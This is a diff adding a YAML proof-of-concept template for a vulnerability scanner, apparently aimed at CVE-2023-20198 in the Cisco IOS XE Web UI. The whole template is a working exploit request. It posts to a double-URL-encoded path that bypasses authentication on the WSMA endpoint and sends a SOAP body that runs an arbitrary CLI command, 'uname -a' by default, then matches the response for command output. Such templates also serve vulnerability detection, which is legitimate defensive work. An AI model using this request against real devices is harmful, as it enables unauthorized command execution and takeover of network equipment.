@@ -1,0 +1,35 @@
+id: poc-yaml-cisco-iosxe-webui-privilege-escalation
+info:
+  name: Cisco IOS XE Web UI 权限提升漏洞
+  severity: critical
+  tags:
+  - CVE-2023-20198
+  - 两高一弱
+  finger: ios_xe
+variables:
+  cmd: str("uname -a")
+requests:
+- method: POST
+  path: /%2577eb%2575i_%2577sma_Http
+  data: '<?xml version="1.0"?> <SOAP:Envelope xmlns:SOAP="http://schemas.xmlsoap.org/soap/envelope/"
+    xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsd="http://www.w3.org/2001/XMLSchema"
+    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"> <SOAP:Header> <wsse:Security
+    xmlns:wsse="http://schemas.xmlsoap.org/ws/2002/04/secext"> <wsse:UsernameToken
+    SOAP:mustUnderstand="false"> <wsse:Username>admin</wsse:Username><wsse:Password>*****</wsse:Password></wsse:UsernameToken></wsse:Security></SOAP:Header><SOAP:Body><request
+    correlator="exec1" xmlns="urn:cisco:wsma-exec"> <execCLI xsd="false"><cmd>{{.cmd}}</cmd><dialogue><expect></expect><reply></reply></dialogue></execCLI></request></SOAP:Body></SOAP:Envelope>
+
+    '
+  expression: 'status_code == 200
+
+    && contains(body, "XMLSchema")
+
+    && contains(body, "execLog")
+
+    && contains(body, "Cisco Systems")
+
+    && contains(body, "<text>")
+
+    && matches(body, "<text>\\n(.*)\\[")
+
+    '
+transport: http
